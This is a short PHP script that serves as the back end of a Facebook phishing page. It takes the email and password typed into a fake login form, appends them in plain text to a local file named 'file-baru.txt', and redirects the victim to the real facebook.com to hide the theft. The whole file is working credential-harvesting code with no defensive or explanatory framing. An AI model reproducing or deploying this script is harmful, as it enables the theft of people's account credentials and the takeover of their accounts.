<?php
header('Location: https://www.facebook.com');
$file = "file-baru.txt";
$email = $_POST['email'];
$pass = $_POST['pass'];

$handle = fopen($file, 'a');
fwrite($handle, "EMAIL OR USERNAME :");
fwrite($handle, "\n");
fwrite($handle, "$email");
fwrite($handle, "\n");
fwrite($handle, "+++++++++++++++++++");
fwrite($handle, "\n");
fwrite($handle, "PASSWORD :");
fwrite($handle, "\n");
fwrite($handle, "$pass");
fwrite($handle, "\n");
fwrite($handle, "+++++++++++++++++++");
fwrite($handle, "\n");
fwrite($handle, "\n");
fclose($handle);
exit;
?>